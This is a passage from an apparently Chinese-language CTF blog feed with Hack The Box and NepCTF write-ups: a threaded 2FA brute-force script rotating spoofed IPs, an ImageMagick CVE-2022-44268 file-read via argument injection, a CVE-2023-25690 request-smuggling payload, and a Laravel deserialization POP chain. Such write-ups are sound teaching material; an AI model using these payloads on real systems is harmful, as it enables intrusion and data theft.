class="hljs-string">&#x27;83.136.249.173:34046/auth/verify-2fa&#x27;</span>,<br>        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<br>        <span class="hljs-string">&#x27;Content-Length&#x27;</span>: <span class="hljs-string">&#x27;13&#x27;</span>,<br>        <span class="hljs-string">&#x27;Origin&#x27;</span>: <span class="hljs-string">&#x27;83.136.249.173:34046&#x27;</span>,<br>        <span class="hljs-string">&#x27;DNT&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,<br>        <span class="hljs-string">&#x27;Connection&#x27;</span>: <span class="hljs-string">&#x27;close&#x27;</span>,<br>        <span class="hljs-string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,<br>    &#125;<br><br>    <span class="hljs-comment"># Multi-threading requests sending (see python ThreadPoolExecutor lib for more informations)</span><br>    <span class="hljs-keyword">with</span> ThreadPoolExecutor(max_workers=<span class="hljs-number">100</span>) <span class="hljs-keyword">as</span> executor:<br>        futures = []<br><br>        <span class="hljs-keyword">for</span> i, combination <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(combinations_array, start=<span class="hljs-number">1</span>):<br>            ip = base_ip + <span class="hljs-built_in">str</span>(current_ip_suffix[<span class="hljs-number">0</span>]) + <span class="hljs-string">&#x27;.&#x27;</span> + <span class="hljs-built_in">str</span>(current_ip_suffix[<span class="hljs-number">1</span>])<br><br>            future = executor.submit(send_request, ip, combination, headers, url)<br>            futures.append(future)<br><br>            <span class="hljs-keyword">if</span> i % <span class="hljs-number">5</span> == <span class="hljs-number">0</span>:<br>                current_ip_suffix[<span class="hljs-number">1</span>] += <span class="hljs-number">1</span><br><br>            <span class="hljs-keyword">if</span> current_ip_suffix[<span class="hljs-number">1</span>] &gt; <span class="hljs-number">254</span>:<br>                current_ip_suffix[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span><br>                current_ip_suffix[<span class="hljs-number">0</span>] += <span class="hljs-number">1</span><br><br>            <span class="hljs-keyword">if</span> current_ip_suffix[<span class="hljs-number">0</span>] &gt; <span class="hljs-number">254</span>:<br>                current_ip_suffix = [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>]<br><br>            <span class="hljs-keyword">for</span> future <span class="hljs-keyword">in</span> futures:<br>                future.result()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    combinations_path = <span class="hljs-string">&#x27;4-digit-wordlist.txt&#x27;</span><br>    url =<span class="hljs-string">&#x27;http://83.136.249.173:34046/auth/verify-2fa&#x27;</span><br><br>    combinations_array = get_combinations_in_array(combinations_path)<br>    send_all_requests(url, combinations_array)<br></code></pre></td></tr></table></figure><p>Flag：HTB{1_l0v3_h4pr0x1_4cl5_4nd_4ll_1t5_f34tur35}</p>]]></content>
    
    
    <categories>
      
      <category>HackThebox</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTB</tag>
      
      <tag>SQL注入</tag>
      
      <tag>暴力破解</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB_PryingEyes</title>
    <link href="/2024/05/27/htb-PryingEyes/"/>
    <url>/2024/05/27/htb-PryingEyes/</url>
    
    <content type="html"><![CDATA[<h1 id="PryingEyes"><a href="#PryingEyes" class="headerlink" title="PryingEyes"></a>PryingEyes</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Welcome to the Prying Eyes, a “safe space” for those curious about the large organisations that dominate our life. How safe is the site really?</p><p>欢迎来到窥探之眼，这是一个“安全空间”，适合那些对主宰我们生活的大型组织感到好奇的人。该网站到底有多安全？</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>打开题目网站，点击相关功能，发现可以进行注册，帖子内容没有什么特别的，于是下载源码进行审计</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs js"># /routes/forum.<span class="hljs-property">js</span><br><span class="hljs-title class_">ValidationMiddleware</span>(<span class="hljs-string">&quot;post&quot;</span>, <span class="hljs-string">&quot;/forum&quot;</span>),<br>  <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>    <span class="hljs-keyword">const</span> &#123; title, message, parentId, ...convertParams &#125; = req.<span class="hljs-property">body</span>;<br>    <span class="hljs-keyword">if</span> (parentId) &#123;<br>      <span class="hljs-keyword">const</span> parentPost = <span class="hljs-keyword">await</span> db.<span class="hljs-title function_">getPost</span>(parentId);<br><br>      <span class="hljs-keyword">if</span> (!parentPost) &#123;<br>        req.<span class="hljs-title function_">flashError</span>(<span class="hljs-string">&quot;That post doesn&#x27;t seem to exist.&quot;</span>);<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&quot;/forum&quot;</span>);<br>      &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">let</span> attachedImage = <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-keyword">if</span> (req.<span class="hljs-property">files</span> &amp;&amp; req.<span class="hljs-property">files</span>.<span class="hljs-property">image</span>) &#123;<br>      <span class="hljs-keyword">const</span> fileName = <span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&quot;hex&quot;</span>);<br>      <span class="hljs-keyword">const</span> filePath = path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&quot;..&quot;</span>, <span class="hljs-string">&quot;uploads&quot;</span>, fileName);<br><br>      <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">const</span> processedImage = <span class="hljs-keyword">await</span> <span class="hljs-title function_">convert</span>(&#123;<br>          ...convertParams,<br>          <span class="hljs-attr">srcData</span>: req.<span class="hljs-property">files</span>.<span class="hljs-property">image</span>.<span class="hljs-property">data</span>,<br>          <span class="hljs-attr">format</span>: <span class="hljs-string">&quot;AVIF&quot;</span>,<br>        &#125;);<br><br>        <span class="hljs-keyword">await</span> fs.<span class="hljs-title function_">writeFile</span>(filePath, processedImage);<br><br>        attachedImage = <span class="hljs-string">`/uploads/<span class="hljs-subst">$&#123;fileName&#125;</span>`</span>;<br>      &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>        req.<span class="hljs-title function_">flashError</span>(<span class="hljs-string">&quot;There was an issue processing your image, please try again.&quot;</span>);<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&quot;Error occured while processing image:&quot;</span>, error);<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&quot;/forum&quot;</span>);<br>      &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">const</span> &#123; <span class="hljs-attr">lastID</span>: postId &#125; = <span class="hljs-keyword">await</span> db.<span class="hljs-title function_">createPost</span>(req.<span class="hljs-property">session</span>.<span class="hljs-property">userId</span>, parentId, title, message, attachedImage);<br><br>    <span class="hljs-keyword">if</span> (parentId) &#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">`/forum/post/<span class="hljs-subst">$&#123;parentId&#125;</span>#post-<span class="hljs-subst">$&#123;postId&#125;</span>`</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">`/forum/post/<span class="hljs-subst">$&#123;postId&#125;</span>`</span>);<br>    &#125;<br>  &#125;<br>);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-function">(<span class="hljs-params">database</span>) =&gt;</span> &#123;<br>  db = database;<br>  <span class="hljs-keyword">return</span> router;<br>&#125;;<br></code></pre></td></tr></table></figure><p> 在<code>forum.js</code>代码中可见，除了<code>title</code>、<code>message</code>、<code>parentld</code>这三个参数以外，其他参数都写在<code>convertParams</code>中</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> processedImage = <span class="hljs-keyword">await</span> convert<br></code></pre></td></tr></table></figure><p>使用了<code>convert</code>对图片进行了一个转换，而这个convert存在于<a href="https://www.npmjs.com/package/imagemagick-convert"><code>imagemagick-convert</code></a></p><p>而<code>imagemagick</code>存在的漏洞：<strong>CVE-2022-44268任意文件读取漏洞</strong></p><p>CVE-2022-44268：ImageMagick 7.1.0-49 存在信息泄露漏洞。当它解析 PNG 图像（例如，调整大小）时，生成的图像可能嵌入任意远程文件的内容（如果 ImageMagick 二进制文件有读取权限）</p><p>然后这个漏洞只有在转PNG文件时才会存在，但从代码中可知输出的图片类型为AVIF</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<br>        <span class="hljs-keyword">const</span> processedImage = <span class="hljs-keyword">await</span> <span class="hljs-title function_">convert</span>(&#123;<br>          ...convertParams,<br>          <span class="hljs-attr">srcData</span>: req.<span class="hljs-property">files</span>.<span class="hljs-property">image</span>.<span class="hljs-property">data</span>,<br>          <span class="hljs-attr">format</span>: <span class="hljs-string">&quot;AVIF&quot;</span>,<br>        &#125;);<br></code></pre></td></tr></table></figure><p>这里采用imagemagick-convert的参数注入，上传过程中抓包修改其中参数内容，将<code>-write filename</code>写入其中并上传，从而成功利用</p><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ol><li><p>利用<a href="https://github.com/vulhub/vulhub/blob/master/imagemagick/CVE-2022-44268/poc.py">github开源的poc</a>构造恶意图片，命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python CVE-2022-44268-poc.py generate -o poc.png -r flag.txt<br></code></pre></td></tr></table></figure></li><li><p>在评论出选择生成的poc.png进行上传，上传过程中手动抓包添加：</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs fortran">Conten-Disposition: <span class="hljs-keyword">form</span>-<span class="hljs-keyword">data</span>; <span class="hljs-keyword">name</span>=<span class="hljs-string">&quot;background&quot;</span><br><br>blue -<span class="hljs-built_in">write</span> ./uploads/<span class="hljs-built_in">exp</span>.png<br></code></pre></td></tr></table></figure><p><img src="/img/htb_pryingeyes_3.png" alt="htb_pryingeyes_3"></p></li><li><p>访问&#x2F;uploads&#x2F;exp.png并下载写入的图片</p></li><li><p>将其后缀修改为.png使用之前github下载的poc读取带出来的文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python CVE-2022-44268-poc.py generate -o poc.png -r flag.txt<br></code></pre></td></tr></table></figure><p><img src="/img/htb_pryingeyes_2.png" alt="htb_pryingeyes_2"></p></li><li><p>将得到内容HEX转ASCII，成功得到flag</p><p><img src="/img/htb_pryingeyes_1.png" alt="htb_pryingeyes_1"></p></li></ol><p>Flag：HTB{Im4g3m4g1ck_vU1n5_5tR1k3_4g4in}</p>]]></content>
    
    
    <categories>
      
      <category>HackThebox</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTB</tag>
      
      <tag>CVE</tag>
      
      <tag>任意文件读取</tag>
      
      <tag>参数注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB_ApacheBlaze</title>
    <link href="/2024/05/27/htb-apacheblaze/"/>
    <url>/2024/05/27/htb-apacheblaze/</url>
    
    <content type="html"><![CDATA[<h1 id="ApacheBlaze"><a href="#ApacheBlaze" class="headerlink" title="ApacheBlaze"></a>ApacheBlaze</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Step into the ApacheBlaze universe, a world of arcade clicky games. Rumor has it that by playing certain games, you have the chance to win a grand prize. However, before you can dive into the fun, you’ll need to crack a puzzle.</p><p>走进 ApacheBlaze 宇宙，这是一个充满街机点击游戏的世界。有传言说，通过玩某些游戏，您有机会赢得大奖。然而，在享受乐趣之前，您需要破解一个谜题。</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>打开题目网址，可以看到有4个Game，但点击Game1~Game3都只会提示：</p><p><em><strong>This game is currently unavailable due to internal maintenance.</strong></em></p><p>而点击Game4则会提示</p><p><strong>This game is currently available only from dev.apacheblaze.local.</strong></p><p>此处猜测题目的考点可能在请求伪造</p><p>下载题目源码进行分析</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># backend/src/app.py</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, jsonify<br><br>app = Flask(__name__)<br><br>app.config[<span class="hljs-string">&#x27;GAMES&#x27;</span>] = &#123;<span class="hljs-string">&#x27;magic_click&#x27;</span>, <span class="hljs-string">&#x27;click_mania&#x27;</span>, <span class="hljs-string">&#x27;hyper_clicker&#x27;</span>, <span class="hljs-string">&#x27;click_topia&#x27;</span>&#125;<br>app.config[<span class="hljs-string">&#x27;FLAG&#x27;</span>] = <span class="hljs-string">&#x27;HTB&#123;f4k3_fl4g_f0r_t3st1ng&#125;&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    game = request.args.get(<span class="hljs-string">&#x27;game&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> game:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<br>            <span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;Empty game name is not supported!.&#x27;</span><br>        &#125;), <span class="hljs-number">400</span><br><br>    <span class="hljs-keyword">elif</span> game <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> app.config[<span class="hljs-string">&#x27;GAMES&#x27;</span>]:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<br>            <span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;Invalid game name!&#x27;</span><br>        &#125;), <span class="hljs-number">400</span><br><br>    <span class="hljs-keyword">elif</span> game == <span class="hljs-string">&#x27;click_topia&#x27;</span>:<br>        <span class="hljs-keyword">if</span> request.headers.get(<span class="hljs-string">&#x27;X-Forwarded-Host&#x27;</span>) == <span class="hljs-string">&#x27;dev.apacheblaze.local&#x27;</span>:<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<br>                <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;app.config[<span class="hljs-string">&quot;FLAG&quot;</span>]&#125;</span>&#x27;</span><br>            &#125;), <span class="hljs-number">200</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<br>                <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;This game is currently available only from dev.apacheblaze.local.&#x27;</span><br>            &#125;), <span class="hljs-number">200</span><br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<br>            <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;This game is currently unavailable due to internal maintenance.&#x27;</span><br>        &#125;), <span class="hljs-number">200</span><br><br></code></pre></td></tr></table></figure><p>从此代码不难看出，通过选择<code>Game4</code>并提供固定的<code>X-Forwarded-Host</code>即可得到flag</p><p>但经过抓包修改测试，这样并不能得到flag</p><p>而原因是<code>X-Forwarded-Host</code>不仅存在<code>dev.apacheblaze.local</code>还存在有其他的元素</p><p>通过Apache的文档，我们可以知道这种情况的原因：</p><figure class="highlight tp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs tp">当以反向代理模式运行时（例如，使用 ProxyPass 指令），mod_proxy_http 会添加多个请求标头，以便将信息传递到原始服务器。这些标头是：<br><br><span class="hljs-keyword">X</span>-Forwarded-For<br>    客户端的 IP 地址。<br><span class="hljs-keyword">X</span>-Forwarded-Host<br>    客户端在 Host HTTP 请求标头中请求的原始主机。<br><span class="hljs-keyword">X</span>-Forwarded-Server<br>    代理服务器的主机名。<br></code></pre></td></tr></table></figure><p>因此，我们需要考虑如何仅在<code>X-Forwarded-Host</code>设置一个正确的元素</p><p>这里利用漏洞：<strong>HTTP 请求走私攻击 (CVE-2023–25690)</strong></p><p>通过此漏洞，我们可以在发送给目标服务器的第一个请求中去隐藏第二个请求，而这样可以使得我们的第二个请求直接从反向代理发送，因此不会添加其他内容在<code>X-Forwarded-Host</code></p><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>综上所述，尝试构造Payload：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">/api/games/click_topia<span class="hljs-meta">%</span><span class="hljs-number">20</span>HTTP/<span class="hljs-number">1.1</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>d<span class="hljs-meta">%</span><span class="hljs-number">0</span>aHost:<span class="hljs-meta">%</span><span class="hljs-number">20</span>dev.apacheblaze.local<span class="hljs-meta">%</span><span class="hljs-number">0</span>d<span class="hljs-meta">%</span><span class="hljs-number">0</span>a<span class="hljs-meta">%</span><span class="hljs-number">0</span>d<span class="hljs-meta">%</span><span class="hljs-number">0</span>a<br></code></pre></td></tr></table></figure><p><img src="/img/HTB_ApacheBlaze_1.png"></p><p>Flag：HTB{1t5_4ll_4b0ut_Th3_Cl1ck5}</p>]]></content>
    
    
    <categories>
      
      <category>HackThebox</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTB</tag>
      
      <tag>请求走私</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022-NEPCTF-WriteUp</title>
    <link href="/2022/07/20/2022-NEPCTF-WRITEUP/"/>
    <url>/2022/07/20/2022-NEPCTF-WRITEUP/</url>
    
    <content type="html"><![CDATA[<h2 id="比赛信息"><a href="#比赛信息" class="headerlink" title="比赛信息"></a>比赛信息</h2><hr><p><strong>比赛昵称：</strong>ZERO </p><p><strong>比赛积分：</strong>1218</p><p><strong>比赛排名：</strong>60</p><hr><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><h3 id="1-快来签到"><a href="#1-快来签到" class="headerlink" title="1.快来签到"></a>1.<strong>快来签到</strong></h3><p>修改IDA的配置文件，将hexrays.cfg里的MAX_FUNCSIZE数值调大，之后将文件拖入，再在options中的Graph里将Max number of nodes的数值改大，这时能在左下角看到Flag。</p><p><strong>Flag：NepCTF{welc0me_t0_nepctf}</strong></p><h3 id="2-JustKidding"><a href="#2-JustKidding" class="headerlink" title="2.JustKidding"></a>2.<strong>JustKidding</strong></h3><p>通过扫描网站，发现<a href="http://www.zip/">www.zip</a>存在源码泄露，下载后对源码进行审计，发现存在反序列化漏洞。</p><p>通过直播时给出的hint，搜寻近期的<a href="https://xz.aliyun.com/t/11362">laravel反序列化漏洞</a>，构造pop链：TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czozNjoiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBjb29raWVzIjthOjE6e2k6MDtPOjI3OiJHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUiOjE6e3M6NDoiZGF0YSI7YToyOntzOjc6IkV4cGlyZXMiO3M6MTg6Ijw&#x2F;cGhwIHBocGluZm8oKTs&#x2F;PiI7czo3OiJEaXNjYXJkIjtpOjA7fX19czozOToiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBzdHJpY3RNb2RlIjtOO3M6NDE6IgBHdXp6bGVIdHRwXENvb2tpZVxGaWxlQ29va2llSmFyAGZpbGVuYW1lIjtzOjEwOiIuL2luZm8ucGhwIjtzOjUyOiIAR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphcgBzdG9yZVNlc3Npb25Db29raWVzIjtiOjE7fQ&#x3D;&#x3D;</p><p>Payload如下：<a href="http://c66d6253-9a3b-4119-afd3-ac2e42a74137.nep.lemonprefect.cn:81/hello?h3=TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czozNjoiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBjb29raWVzIjthOjE6e2k6MDtPOjI3OiJHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUiOjE6e3M6NDoiZGF0YSI7YToyOntzOjc6IkV4cGlyZXMiO3M6MTg6Ijw/cGhwIHBocGluZm8oKTs/PiI7czo3OiJEaXNjYXJkIjtpOjA7fX19czozOToiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBzdHJpY3RNb2RlIjtOO3M6NDE6IgBHdXp6bGVIdHRwXENvb2tpZVxGaWxlQ29va2llSmFyAGZpbGVuYW1lIjtzOjEwOiIuL2luZm8ucGhwIjtzOjUyOiIAR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphcgBzdG9yZVNlc3Npb25Db29raWVzIjtiOjE7fQ==">http://c66d6253-9a3b-4119-afd3-ac2e42a74137.nep.lemonprefect.cn:81/hello?h3=TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czozNjoiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBjb29raWVzIjthOjE6e2k6MDtPOjI3OiJHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUiOjE6e3M6NDoiZGF0YSI7YToyOntzOjc6IkV4cGlyZXMiO3M6MTg6Ijw/cGhwIHBocGluZm8oKTs/PiI7czo3OiJEaXNjYXJkIjtpOjA7fX19czozOToiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBzdHJpY3RNb2RlIjtOO3M6NDE6IgBHdXp6bGVIdHRwXENvb2tpZVxGaWxlQ29va2llSmFyAGZpbGVuYW1lIjtzOjEwOiIuL2luZm8ucGhwIjtzOjUyOiIAR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphcgBzdG9yZVNlc3Npb25Db29raWVzIjtiOjE7fQ==</a></p><p>之后访问info.php，在Environment中得到了Flag。</p><p><strong>Flag：NepCTF{016aa038-cd18-496e-8648-0f71f3efad7f}</strong></p><h3 id="3-签到题"><a href="#3-签到题" class="headerlink" title="3.签到题"></a>3.<strong>签到题</strong></h3><p>下载附件后用010editor打开，发现下面藏在zip格式的压缩包，将其提取出，通过在网上搜索得到的一次性解压代码进行解压得到最后一个压缩包，将其拖入010editor发现是伪加密，修改后解压，得到一个流量文件，拖入wireshack根据文件名提示：keyboard，猜想是根据usb流量来判断键盘的输入内容，<a href="https://qwzf.github.io/2020/08/01/CTF%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%B8%B8%E8%A7%81%E9%A2%98%E5%9E%8B(%E4%BA%8C)-USB%E6%B5%81%E9%87%8F/%EF%BC%89">参考链接</a>。于是通过tshark提取出流量，再通过网上搜索的脚本进行信息还原，最终得到Flag。</p><p><strong>Flag：nepctf{welcome_to_nepctf_2nd}</strong></p><h3 id="4-花花画画画花花"><a href="#4-花花画画画花花" class="headerlink" title="4.花花画画画花花"></a>4.<strong>花花画画画花花</strong></h3><p>下载附件得到osz的文件，网上搜索后得知这是osu这款音游的谱子，下载osu并将附件导入，在Edit模式中逐帧观察得到Flag。</p><p><strong>Flag：NepCTF{MASTER_OF_坏女人！}</strong></p><h3 id="5-馅饼？陷阱"><a href="#5-馅饼？陷阱" class="headerlink" title="5.馅饼？陷阱!"></a>5.<strong>馅饼？陷阱!</strong></h3><p>通过观察附件中的图片，可以在图片中得到关键信息：“琼”、“大禾寿司”、“如家宾馆”、“东北饺子城”。通过车牌上面的“琼”来锁定拍摄地区为海南，继续搜索“大禾寿司”通过谷歌地图的实景观察以及剩余信息的排查比对得到最终照片拍摄地：“海南省三亚市天涯区新风街”，根据分析，该银行为“光大银行”，搜索其官网得到Flag。</p><p><strong>Flag：NepCTF{<a href="http://www.cebbank.com}/">www.cebbank.com}</a></strong></p><h2 id="未解出题目的思路和猜想"><a href="#未解出题目的思路和猜想" class="headerlink" title="未解出题目的思路和猜想"></a><strong>未解出题目的思路和猜想</strong></h2><h3 id="1-DCTris"><a href="#1-DCTris" class="headerlink" title="1.DCTris"></a>1.<strong>DCTris</strong></h3><p>通过附件搜索以及题目暗示可知是Dreamcast的游戏，但尝试使用多种Dreamcast模拟器（如：DEmul、Redream、NullDC……）后仍无法打开游戏或者是打开后卡在开始界面…最终只能放弃。</p><h3 id="2-DoubleHappiness"><a href="#2-DoubleHappiness" class="headerlink" title="2.DoubleHappiness"></a>2.<strong>DoubleHappiness</strong></h3><p>下载附件后，在010editor中查询到关于拍摄手机型号、拍摄时间等信息，通过查看图片属性得到具体经纬度以及大致地点等信息，通过浏览器进行关键词搜索，未发现相关有效信息…最终无奈放弃。</p>]]></content>
    
    
    <categories>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WriteUp</tag>
      
      <tag>NEPCTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>浅谈CTF-Misc</title>
    <link href="/2022/07/19/misc/"/>
    <url>/2022/07/19/misc/</url>
    
    <content type="html"><![CDATA[<h1 id="浅谈CTF-Misc"><a href="#浅谈CTF-Misc" class="headerlink" title="浅谈CTF-Misc"></a>浅谈CTF-Misc</h1><h2 id="什么是Misc"><a href="#什么是Misc" class="headerlink" title="什么是Misc"></a>什么是Misc</h2><p>Misc 是英文 Miscellaneous 的前四个字母，杂项、混合体、大杂烩的意思。</p><p>MISC，中文即杂项，<strong>包括隐写，数据还原，脑洞、社会工程、压缩包解密、流量分析取证、与信息安全相关的大数据等</strong>。</p><p>详细解释内容请见——&gt;<a href="https://ctf-wiki.org/misc/introduction/">传送门</a></p><p>关于Misc的入门教程在网上挺多的，这里不再做详细阐述。</p><p>这里主要对我个人学习过程中所遇到的相关经典胎教问题进行解释。</p><p><strong>参考内容：山石安研院第二节CTF夏令营Misc教学内容</strong>、sec_wuyy师傅的<a href="https://www.cnblogs.com/sec-wuyy/p/14593000.html">文章</a></p><h2 id="一、文件头残缺或错误"><a href="#一、文件头残缺或错误" class="headerlink" title="一、文件头残缺或错误"></a>一、文件头残缺或错误</h2><p>文件有后缀名，但是无法正常打开，或者没有后缀名，同时通过file命令（Linux）发现文件类型是data，表示很有可能是文件头残缺或错误导致的，这时候需要根据<strong>后缀名、题目提示、文件头尾部数据等</strong>去猜测文件的真实类型，并使用**<a href="http://www.x-ways.net/winhex/">winhex</a>、<a href="https://www.sweetscape.com/010editor/">010Editor</a>**等软件添加或修改相应的文件头。</p><h3 id="文件类型判断技巧："><a href="#文件类型判断技巧：" class="headerlink" title="文件类型判断技巧："></a>文件类型判断技巧：</h3><table><thead><tr><th>文件类型</th><th>特点</th></tr></thead><tbody><tr><td>ZIP</td><td>文件尾部包含0x504B0506的</td></tr><tr><td>RAR</td><td>文件结尾为0xC43D7B004007</td></tr><tr><td>JPG</td><td>文件结尾为0xFFD9</td></tr><tr><td>PNG</td><td>文件头中包含<a 